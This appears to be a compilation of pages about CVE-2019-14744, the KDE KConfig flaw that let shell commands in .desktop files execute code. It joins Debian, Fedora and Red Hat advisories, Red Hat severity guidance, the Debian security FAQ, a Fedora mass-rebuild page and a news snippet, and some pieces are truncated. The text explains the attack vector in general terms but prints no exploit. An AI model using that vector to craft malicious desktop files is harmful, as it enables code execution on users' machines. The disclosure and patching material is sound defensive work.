## Goal

The goal is to rebuild every single Fedora package, regardless of
content, before the Fedora 31 Change Deadline.

## Driving Features

* [Automatic R runtime dependencies](/wiki/Changes/Automatic_R_runtime_dependencies "Changes/Automatic R runtime dependencies")
* [Python means Python3](/wiki/Changes/Python_means_Python3 "Changes/Python means Python3")
* [The GNU C Library version 2.30](/wiki/Changes/GLIBC230 "Changes/GLIBC230")
* [Switch RPMs to zstd compression](/wiki/Changes/Switch_RPMs_to_zstd_compression "Changes/Switch RPMs to zstd compression")
* [Changes/MinGW environment and toolchain update](/wiki/Changes/MingwEnvToolchainUpdate "Changes/MingwEnvToolchainUpdate")
* [Golang 1.13](/wiki/Changes/golang1.13 "Changes/golang1.13")

## Schedule

Given the changes required for the above features and the given
schedules, Release Engineering will be ready to start scripted rebuilds
on Wednesday, July 24th. All automated rebuilds should be finished prior to the Feature Freeze.
Any clean-up manual rebuilds should be finished prior to the Beta Change Deadline.

## Scripts

Release Engineering has created two scripts. One is to initiate the builds, and the other is to query for items still needing to be built.

### Build Initiation

The rebuild [script](https://pagure.io/releng/blob/master/f/scripts/mass-rebuild.py) works in the following way:

```
 Generate a list of all packages in f31
 Loop through each package:
   Query if a build has already been attempted/completed since koji changes went live.
   If so, move to next package
   If not, check out git
   rpmdev-bumpspec
   fedpkg commit -cp
   fedpkg (background) build
   Move on to next package

```

Each step will have some error catching and logging so that people
can clean up the various failures for whatever reasons. The builds will
be background builds, which will allow other builds done to take higher
priority when a builder has a free slot. However maintainers should
take care when doing this so that the background build won't take
'latest' precedent when it finishes. Asking rel-eng to kill the
scripted build will typically be enough.

### Build Tagging

Once the rebuild script has finished, another [script](https://pagure.io/releng/blob/master/f/scripts/mass-tag.py) will run to tag the builds into f31. This script will check that a newer build hasn't been done or started in f31 since the scripted rebuild was submitted. This will protect against the scripted rebuild overriding an even newer build done while the scripted rebuild was waiting in the background.

### Status Query

Release Engineering has developed a [script](https://pagure.io/releng/blob/master/f/scripts/need-rebuild.py) to query f31
and report on packages that have yet to be rebuilt. Results of these
queries will be delivered to various places, yet to be determined,
broken down by maintainer for easier discovery of work needed.

## Maintainer Actions

* Maintainers can help this effort by ensuring **rpmdev-bumpspec** correctly bumps your package's spec files.
* Maintainers should ensure that their packages currently build from source.
* Maintainers should ensure that there are no unwanted changes committed to git but not built yet.

## Frequently Asked Questions

### When will my own build "count" for the rebuild?

After the last piece needed for the mass rebuild a golang build was put into place, a build done by a maintainer will "count" toward the rebuild. 2019-07-24 09:40:00 is the UTC time that builds count from

### Will the rebuilds be ordered?

Currently there is no plan to logically order the rebuilds based on deps. The ordering will be alphanumerical based on package name. There are no planned ABI/soname changes that would require logical build ordering. Further, all the builds will be kept in a special tag (f31-rebuild) until the whole run is done, and then they will be tagged into f31 in one shot to minimize the shuffle of buildroot contents during the rebuilds.

## Feedback

Questions/comments/concerns should be directed to [[1]](https://lists.fedoraproject.org/mailman/listinfo/devel), or #fedora-releng on freenode IRC.

Hash: SHA512

Package        : kde4libs
Version        : 4:4.14.2-5+deb8u3
CVE ID         : CVE-2019-14744
Debian Bug     : 934268

Dominik Penner discovered a flaw in how KConfig interpreted shell
commands in desktop files and other configuration files. An attacker may
trick users into installing specially crafted files which could then be
used to execute arbitrary code, e.g. a file manager trying to find out
the icon for a file or any application using KConfig. Thus the entire
feature of supporting shell commands in KConfig entries has been
removed.

For Debian 8 "Jessie", this problem has been fixed in version
4:4.14.2-5+deb8u3.

We recommend that you upgrade your kde4libs packages.

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be

RHEL Engineering is moving the tracking of its product development work on RHEL 6 through RHEL 9 to Red Hat Jira ([**issues.redhat.com**](https://issues.redhat.com)). If you're a Red Hat customer, please continue to file support cases via the [**Red Hat customer portal**](https://access.redhat.com/support/cases/). If you're not, please head to the "[**RHEL project**](https://issues.redhat.com/projects/RHEL)" in Red Hat Jira and file new tickets here. Individual Bugzilla bugs in the statuses "**NEW**", "**ASSIGNED**", and "**POST**" are being migrated throughout September 2023. Bugs of Red Hat partners with an assigned Engineering Partner Manager (EPM) are migrated in late September as per pre-agreed dates. Bugs against components "**kernel**", "**kernel-rt**", and "**kpatch**" are only migrated if still in "**NEW**" or "**ASSIGNED**". If you cannot log in to RH Jira, please consult [**article #7032570**](https://access.redhat.com/articles/7032570). That failing, please send an e-mail to the RH Jira admins at **rh-issues@redhat.com** to troubleshoot your issue as a user management inquiry. The email creates a ServiceNow ticket with Red Hat. Individual Bugzilla bugs that are migrated will be moved to status "**CLOSED**", resolution "**MIGRATED**", and set with "**MigratedToJIRA**" in "**Keywords**". The link to the successor Jira issue will be found under "**Links**", have a little "two-footprint" icon next to it, and direct you to the "[**RHEL project**](https://issues.redhat.com/projects/RHEL)" in Red Hat Jira (issue links are of type "**https://issues.redhat.com/browse/RHEL-XXXX**", where "**X**" is a digit). This same link will be available in a blue banner at the top of the page informing you that that bug has been migrated.

| [Description](show_bug.cgi?id=1740138#c0)  Marian Rehak    2019-08-12 11:04:21 UTC  ``` In KDE Frameworks KConfig before 5.61.0, malicious desktop files and configuration files lead to code execution with minimal user interaction. This relates to libKF5ConfigCore.so, and the mishandling of .desktop and .directory files, as demonstrated by a shell command on an Icon line in a .desktop file.

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

Package        : kconfig
CVE ID         : CVE-2019-14744

Dominik Penner discovered that KConfig, the KDE configuration settings
framework, supported a feature to define shell command execution in
.desktop files. If a user is provided with a malformed .desktop file
(e.g. if it's embedded into a downloaded archive and it gets opened in
a file browser) arbitrary commands could get executed. This update
removes this feature.

For the oldstable distribution (stretch), this problem has been fixed
in version 5.28.0-2+deb9u1.

For the stable distribution (buster), this problem has been fixed in
version 5.54.0-1+deb10u1.

We recommend that you upgrade your kconfig packages.

For the detailed security status of kconfig please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/kconfig>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Fedora Update Notification
FEDORA-2019-9f2ee52c88
2019-08-19 02:28:49.021905
--------------------------------------------------------------------------------

Name : kdelibs3
Product : Fedora 29
Version : 3.5.10
Release : 101.fc29
URL : <http://www.kde.org/>
Summary : KDE 3 Libraries
Description :
Libraries for KDE 3:
KDE Libraries included: kdecore (KDE core library), kdeui (user interface),
kfm (file manager), khtmlw (HTML widget), kio (Input/Output, networking),
kspell (spelling checker), jscript (javascript), kab (addressbook),
kimgio (image manipulation).

--------------------------------------------------------------------------------
Update Information:

This update fixes \*\*CVE-2019-14744 (kconfig arbitrary shell code execution)\*\* in
the KDE 3 compatibility version of kdelibs used by legacy KDE 3 applications.
The full list of fixes in this `kdelibs3` build: \* fixes \*\*CVE-2019-14744\*\* -
`kconfig`: malicious `.desktop` files (and others) would execute code. KConfig
had a well-meaning feature that allowed configuration files to execute arbitrary
shell commands. Unfortunately, this could be abused by untrusted `.desktop`
files to execute arbitrary code as the target user, without the user even
running the `.desktop` file. Therefore, this update removes that ill-fated
feature. (Backported by Kevin Kofler from upstream: `kf5-kconfig` fix by David
Faure, `kdelibs` 4 backport by Kai Uwe Broulik.) \* adds native support for
\*\*xdg-user-dirs\*\* for \*Desktop\* and \*Documents\*, without shelling out to `xdg-
user-dir` from the config file. This is needed due to the above security fix.
(This feature was previously implemented in the Fedora `kde-settings` by
shelling out to `xdg-user-dir` from the config file using the KConfig feature
removed above.) (Backported by Kevin Kofler from Trinity Desktop / Timothy
Pearson.) \* fixes a \*\*KJS double-free\*\* that could crash legacy KDE 3
applications such as Quanta Plus when trying to execute JavaScript. (Backported
by OpenSUSE / Wolfgang Bauer from Trinity Desktop / Timothy Pearson.)
--------------------------------------------------------------------------------
ChangeLog:

\* Sat Aug 10 2019 Kevin Kofler Kevin@tigcc.ticalc.org - 3.5.10-101
- Backport CVE-2019-14744 fix by David Faure and Kai Uwe Broulik from kdelibs 4
- Backport native xdg-user-dirs support by Timothy Pearson from Trinity (needed
to fix the regression that would otherwise result from the above security fix)
- Backport KJS double-free fix by Timothy Pearson (backport by wbauer/OpenSUSE)
\* Thu Jul 25 2019 Fedora Release Engineering releng@fedoraproject.org - 3.5.10-100
- Rebuilt for <https://fedoraproject.org/wiki/Fedora_31_Mass_Rebuild>
\* Thu Apr 11 2019 Richard Shaw hobbes1069@gmail.com - 3.5.10-99
- Rebuild for OpenEXR 2.3.0.
\* Fri Feb 1 2019 Fedora Release Engineering releng@fedoraproject.org - 3.5.10-98
- Rebuilt for <https://fedoraproject.org/wiki/Fedora_30_Mass_Rebuild>
\* Sat Jan 5 2019 Kevin Kofler Kevin@tigcc.ticalc.org - 3.5.10-97
- Rebuild for the new hardcoded qt3 build key in Rawhide
- Fix aarch64 FTBFS due to libtool not liking the file output on \*.so files

# Unpatched KDE vulnerability disclosed on Twitter

Just viewing --not running-- a malicious .desktop or .directory file inside a file browser can run malicious code on a user's system.

### TechRepubli

 [![2fnltensorflow1.png]()
### Cheat sheet: TensorFlow, an open source software library for machine learning

Read now](https://www.techrepublic.com/article/tensorflow-googles-open-source-software-library-for-machine-learning-the-smart-persons-guide/?ftag=CMG-01-10aaa1b)

A security researcher has published proof-of-concept (PoC) code for a vulnerability in the KDE software framework. A fix is not available at the time of writing.

The bug was discovered by [Dominik "zer0pwn" Penner](https://twitter.com/zer0pwn) and impacts the KDE Frameworks package 5.60.0 and below.

